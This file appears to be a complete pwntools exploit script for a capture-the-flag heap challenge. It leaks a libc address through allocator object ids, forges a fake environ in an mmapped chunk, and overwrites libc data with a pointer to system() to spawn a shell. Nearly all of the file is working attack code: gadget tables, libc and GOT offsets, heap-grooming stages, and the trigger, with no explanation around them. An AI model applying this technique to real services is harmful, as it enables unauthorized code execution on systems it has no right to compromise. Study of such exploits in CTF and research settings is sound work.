#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

host = args.HOST or '127.0.0.1'
port = int(args.PORT or 4242) # not 4000 to force use of QIRA arg


library_path = '/root/apps/libc-database/db/libc6_2.31-0ubuntu9.1_amd64/lib/x86_64-linux-gnu'
libc_path = '/root/apps/libc-database/db/libc6_2.31-0ubuntu9.1_amd64/lib/x86_64-linux-gnu/libc-2.31.so'
ld_path = '/root/apps/libc-database/db/libc6_2.31-0ubuntu9.1_amd64/lib/x86_64-linux-gnu/ld-2.31.so'
custom_libc = os.path.exists(libc_path)
# libc = ELF(libc_path)
qira_spawn = '''
LIBC_FATAL_STDERR_=1 QEMU_LD_PREFIX='/root/apps/libc-database/db/libc6_2.31-0ubuntu9.1_amd64' qira -s ./heap
'''

exe_path = 'heap'
exe_path = os.path.abspath(exe_path)
# exe = ELF(exe_path)

context.arch = 'amd64'
# context.log_level = 'error'


if args.QIRA:
  print(qira_spawn)
  host = "127.0.0.1"
  port = 4000

def local(argv=[], *a, **kw):
  if args.GDB:
    # todo add custom libc here
    # todo add iterm spawn here
    return gdb.debug([exe_path] + argv, gdbscript=gdbscript, *a, **kw)
  else:
    # todo add args.QEMU
    env = {
        'LIBC_FATAL_STDERR_': '1',
    }
    # TODO add an option to use LD_LIBRARY_PATH + patched elf(/lib64/ld-my___-x86-64.so__) + auto switching symlink from a patched interpreter
    if custom_libc and not args.SYSTEM_LIBC:
      proc_cmd = [ld_path, '--library-path', library_path, exe_path]
    else:
      proc_cmd = [exe_path]
    print(' '.join(proc_cmd))
    return process(proc_cmd + argv, *a, env=env, **kw)


def remote(argv=[], *a, **kw):
  io = connect(host, port)
  if args.GDB:
    gdb.attach(io, gdbscript=gdbscript)
  return io

def start(argv=[], *a, **kw):
  if args.LOCAL and not args.QIRA:
    return local(argv, *a, **kw)
  else:
    return remote(argv, *a, **kw)

lu64 = lambda x: u64(x.ljust(8, '\x00'))
lu32 = lambda x: u32(x.ljust(4, '\x00'))


gdbscript = '''
continue
'''

'''
0xe6e73 execve("/bin/sh", r10, r12)
constraints:
  [r10] == NULL || r10 == NULL
  [r12] == NULL || r12 == NULL

0xe6e76 execve("/bin/sh", r10, rdx)
constraints:
  [r10] == NULL || r10 == NULL
  [rdx] == NULL || rdx == NULL

0xe6e79 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL


'''

one_gadget = [ 0xe6e73, 0xe6e76, 0xe6e79 ]

# elf gadgets
rop_add_esp_0x38_pop_rbx_pop_rbp_ret = 0x1ab2                # Gadget(0x1ab2, ['add esp, 0x38', 'pop rbx', 'pop rbp', 'ret'], ['rbx', 'rbp'], 0x44)
rop_add_rsp_0x38_pop_rbx_pop_rbp_ret = 0x1ab1                # Gadget(0x1ab1, ['add rsp, 0x38', 'pop rbx', 'pop rbp', 'ret'], ['rbx', 'rbp'], 0x44)
rop_pop_rbp_pop_r12_pop_r13_pop_r14_pop_r15_ret = 0x1c8b     # Gadget(0x1c8b, ['pop rbp', 'pop r12', 'pop r13', 'pop r14', 'pop r15', 'ret'], ['rbp', 'r12', 'r13', 'r14', 'r15'], 0x18)
rop_pop_r12_pop_r13_pop_r14_pop_r15_ret = 0x1c8c             # Gadget(0x1c8c, ['pop r12', 'pop r13', 'pop r14', 'pop r15', 'ret'], ['r12', 'r13', 'r14', 'r15'], 0x14)
rop_pop_rsp_pop_r13_pop_r14_pop_r15_ret = 0x1c8d             # Gadget(0x1c8d, ['pop rsp', 'pop r13', 'pop r14', 'pop r15', 'ret'], ['rsp', 'r13', 'r14', 'r15'], 0x14)
rop_pop_r13_pop_r14_pop_r15_ret = 0x1c8e                     # Gadget(0x1c8e, ['pop r13', 'pop r14', 'pop r15', 'ret'], ['r13', 'r14', 'r15'], 0x10)
rop_pop_rbp_pop_r14_pop_r15_ret = 0x1c8f                     # Gadget(0x1c8f, ['pop rbp', 'pop r14', 'pop r15', 'ret'], ['rbp', 'r14', 'r15'], 0x10)
rop_pop_r14_pop_r15_ret = 0x1c90                             # Gadget(0x1c90, ['pop r14', 'pop r15', 'ret'], ['r14', 'r15'], 0xc)
rop_pop_rsi_pop_r15_ret = 0x1c91                             # Gadget(0x1c91, ['pop rsi', 'pop r15', 'ret'], ['rsi', 'r15'], 0xc)
rop_pop_r15_ret = 0x1c92                                     # Gadget(0x1c92, ['pop r15', 'ret'], ['r15'], 0x8)
rop_pop_rdi_ret = 0x1c93                                     # Gadget(0x1c93, ['pop rdi', 'ret'], ['rdi'], 0x8)
rop_pop_rbx_pop_rbp_ret = 0x1ab5                             # Gadget(0x1ab5, ['pop rbx', 'pop rbp', 'ret'], ['rbx', 'rbp'], 0xc)
rop_add_rsp_8_ret = 0x1016                                   # Gadget(0x1016, ['add rsp, 8', 'ret'], [], 0xc)
rop_add_esp_8_ret = 0x1017                                   # Gadget(0x1017, ['add esp, 8', 'ret'], [], 0xc)
rop_ret = 0x101a                                             # Gadget(0x101a, ['ret'], [], 0x4)
rop_leave_ret = 0x11fc                                       # Gadget(0x11fc, ['leave', 'ret'], ['ebp', 'esp'], 0x2540be403)
rop_pop_rbp_ret = 0x14f1                                     # Gadget(0x14f1, ['pop rbp', 'ret'], ['rbp'], 0x8)

o_exe_got_read              =  0x4040
o_exe_got___errno_location  =  0x4020
o_exe_got___stack_chk_fail  =  0x4038
o_exe_got_strlen            =  0x4030
o_exe_got_malloc            =  0x4048
o_exe_got___libc_start_main =  0x3ff0
o_exe_got_free              =  0x4018
o_exe_got_write             =  0x4028
o_exe_got___gmon_start__    =  0x3ff8
o_exe_got_exit              =  0x4050




o_libc___libc_start_main =   0x26fc0
o_libc_malloc            =   0x9d260
o_libc_strlen            =   0xa27b0
o_libc_exit              =   0x49bc0
o_libc___errno_location  =   0x27430
o_libc___free_hook       =  0x1eeb28
o_libc_write             =  0x1111d0
o_libc_binsh             =  0x1b75aa
o_libc_read              =  0x111130
o_libc_system            =   0x55410
o_libc___realloc_hook    =  0x1ebb68
o_libc___malloc_hook     =  0x1ebb70
o_libc_open              =  0x110e50
o_libc___stack_chk_fail  =  0x132b00
o_libc_free              =   0x9d850



'''
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled

'''

#############################################

io = start()

def alloc(data):
  io.recvuntil('> ')
  io.sendline('1')  
  io.recvuntil('Object size: ')
  io.sendline(str(len(data)))
  io.recvuntil('Object id: ')
  idx = int(io.recvline().strip())
  io.recvuntil('Object content: ')
  io.send(data)  
  return idx

def free(idx):
  io.recvuntil('> ')
  io.sendline('2')  
  io.recvuntil('Object id: ')
  io.sendline(str(idx))

# o1 = alloc(b'a' * (1370 + 16*2))
# __int64  pack(__int64 idx, __int64 i, __int64 j)
# {
#   return j | 8 * (12 * idx + i);
# }
def pack(idx, i, j):
  assert idx >= 0 and idx <= 0xff
  assert i >= 0 and i<= 11
  assert j >= 0 and i<= 7
  return j | 8 * (12 * idx + i)

def unpack(packed):
  j = packed & 0b111
  left = packed >> 3
  idx = left//12
  i = left % 12
  return (idx, i, j)

# stage 0 
# setup heap to have libc pointer in the place of metadata
# the metadata is not zeroed/initialized so we will leak the libc pointer with it

o1 = alloc(b'a' * 16)
o2 = alloc(b'b' * 32)
free(o1)
o3 = alloc(b'c' * 16)

o2_2 = alloc(b'b2___'.ljust(32, b'\x00'))


# allocate chunks with indexes 0-32. 
# we allocate a little less cause there will be 7f left from another libc pointer
# and 1 less cause of metadata
for i in range(6 + 1 + 16):
  name = f'ch_d_{i}'
  idx = alloc(name.ljust(16, '|').encode())
  print(idx)


# now allocate chunks and observe ids
itno = 0
leak = [1] * 64
while True:
  name = f'ch_d*_{itno}'
  objid = alloc(name.ljust(16, '|').encode())
  idx, i, j = unpack(objid)  
  if idx != 0: # next zone, not interested
    break
  # print(f'{objid} => idx {idx} i {i} j {j}')
  i -= 4
  leakidx = i * 8 + j
  leak[leakidx] = 0 # if we got this object, then the pointer has zero bit at this place
  itno+=1

leak = int(''.join(list(reversed([str(i) for i in leak]))), 2)

libc = leak - 2014176
print(f'leak {hex(leak)}')
print(f'libc {hex(libc)}')

# stage 2
# prepare chunk with "sh" at the beginning, we will free it later
free(pack(unpack(o2)[0], 0, 0))

pl = b''
pl += b'sh\x00\x00'
pl += p8(7)
pl += b'\x00' * 11
pl += b')' * 16
o2_3 = alloc(pl)




# stage 3
# prepare a fake environ cause we will fuck op pointer to an original one
# we use wery big size to be above malloc's mmap_threshold, this chunk will be mmaped just above libc
mmaped_chunk_size = 1370 
environ_addr = libc - 0x21000 + mmaped_chunk_size + 16 + 6 # malloc header + 6 for roundup to 16
environ = p64(environ_addr + 16) + p64(0) + b"PATH=/usr/bin/\x00\x00"
print(f'environ_addr {hex(environ_addr)}')
fake_environ_obj_id = alloc(environ.ljust(mmaped_chunk_size)) #

# stage 4
# we free and allocate to the metadata of the mmaped chunk
# raise all bits in bitmask except the last one, we will alocate into the last one
# it will be right in the middle of libc rw section
mmaped_chunk = alloc(b'e' * mmaped_chunk_size) #
idx, i, j = unpack(mmaped_chunk)
free(pack(idx, 0, 0))
target_chunk_sze = 0x5850 # calculated such that mmaped_zone[95] is right inside of libc
metadata = b''
metadata += p32(target_chunk_sze) # size
metadata += b'\xff' # bitmask
metadata += b'\xff' # bitmask
metadata += b'\xff' # bitmask
metadata += b'\xff' # bitmask
metadata += b'\xff' # bitmask
metadata += b'\xff' # bitmask
metadata += b'\xff' # bitmask
metadata += b'\xff' # bitmask
metadata += b'\xff' # bitmask
metadata += b'\xff' # bitmask
metadata += b'\xff' # bitmask
metadata += b'\x7f' # bitmask, last one is not in use
metadata = metadata.ljust(1370,)
mmaped_chunk = alloc(metadata)


pl = b''
pl += b'^' * cyclic_find('fhgafh')
pl += p64(libc + o_libc_system)
pl += b'$' * cyclic_find('raatsaa')
pl += p64(environ_addr)
pl += cyclic(target_chunk_sze - len(pl))

print('before libc blowup')
alloc(pl)

print('triggering')
free(o2_2)
free(o2)

print('gg, enjoy your shell #')


io.interactive()
















